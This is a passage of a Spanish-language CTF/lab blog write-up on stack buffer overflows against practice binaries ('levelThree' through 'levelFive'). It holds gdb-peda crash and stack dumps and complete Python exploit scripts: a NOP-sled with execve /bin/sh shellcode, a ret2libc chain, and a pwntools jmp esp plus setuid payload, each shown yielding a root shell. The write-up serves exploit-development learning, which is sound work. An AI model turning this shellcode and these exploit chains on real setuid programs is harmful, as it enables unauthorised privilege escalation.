<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
  </li>
  <li>
    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/pila.png" />
</p>

<ul>
  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
</ul>

<blockquote>
  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
  </li>
  <li>
    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
  </li>
  <li>
    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
</code></pre></div></div>

<ul>
  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>

<span class="c"># Usamos la dirección deseada en little endian</span>
eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>

<span class="c"># Salida del payload completo</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
Buf: j
      XRh//shh/bin��0�
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="ret2libc">Ret2libc</h2>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
  <li>
    <p>Vamos analizar el código.</p>
  </li>
  <li>
    <p>Esta es la función main.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret.png" />
</p>

<ul>
  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret1.png" />
</p>

<ul>
  <li>
    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
  </li>
  <li>
    <p>Comenzamos enviado 50 bytes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
Reading symbols from levelFour...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 50
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
EDX: 0x1
ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x413b4141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
1094402369 found at offset: 28
</code></pre></div></div>

<ul>
  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
</code></pre></div></div>

<ul>
  <li>Ahora definimos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 28

junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>

print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="level-5">Level 5</h2>

<ul>
  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
from pwn import process, p32

shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>

offset <span class="o">=</span> 16
junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>

setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
shell.interactive<span class="o">()</span>
</code></pre></div></div>

  </div><a class="u-url" href="/vulnhub/machines/2024/05/03/buffer.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
